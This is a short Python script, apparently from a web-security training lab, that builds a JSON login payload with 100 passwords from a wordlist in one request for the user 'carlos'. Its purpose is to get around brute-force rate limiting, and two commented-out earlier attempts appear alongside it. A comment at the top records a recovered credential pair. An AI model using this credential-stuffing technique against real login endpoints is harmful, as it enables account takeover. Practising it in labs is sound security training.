# {"username":"carlos","password":"woejpgf"}

# payload = '{'
# with open('pwd_list.txt', 'r', encoding='utf-8') as readfile:
#     for i in range(100):
#         payload += f'"username":"carlos","password":"{readfile.readline().strip()}";'
# payload += '}'

# with open('payload_lab-broken-brute-force-protection-multiple-credentials-per-request.txt', 'w', encoding='utf-8') as writefile:
#     writefile.write(payload)

# payload = '{"username":"carlos"'
# with open('pwd_list.txt', 'r', encoding='utf-8') as readfile:
#     for i in range(100):
#         payload += f',"password":"{readfile.readline().strip()}"'
# payload += '}'

# with open('payload_lab-broken-brute-force-protection-multiple-credentials-per-request.txt', 'w', encoding='utf-8') as writefile:
#     writefile.write(payload)

payload = '{"username":"carlos","password":['
with open('pwd_list.txt', 'r', encoding='utf-8') as readfile:
    for i in range(100):
        payload += f'"{readfile.readline().strip()}",'
payload += ']}'

with open('payload_lab-broken-brute-force-protection-multiple-credentials-per-request.txt', 'w', encoding='utf-8') as writefile:
    writefile.write(payload)